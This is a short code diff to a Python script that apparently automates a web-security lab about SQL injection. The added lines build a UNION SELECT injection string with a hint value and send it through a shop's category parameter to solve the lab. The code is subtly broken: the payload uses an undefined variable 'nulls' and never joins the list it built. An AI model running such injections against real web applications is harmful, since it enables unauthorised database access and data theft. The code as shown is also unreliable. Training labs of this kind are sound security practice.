@@ -56,7 +56,15 @@ def main(args):
             text_columns.append(i)
     text_columns_str = ", ".join(map(str, text_columns))            
     log.info(f"The text columns are: {text_columns_str}")
-        
+    
+    nulls_list = ["NULL"] * num_columns
+    nulls_list[text_columns[0]] = f"'{hint}'"
+    category = f"' UNION SELECT {nulls}-- "
+    resp = shop.get_category(category)
+    if resp.status_code == 200:    
+        shop.is_solved()
+    #29 10
+    
     
 if __name__ == "__main__":
     args=utils.parse_args(sys.argv)
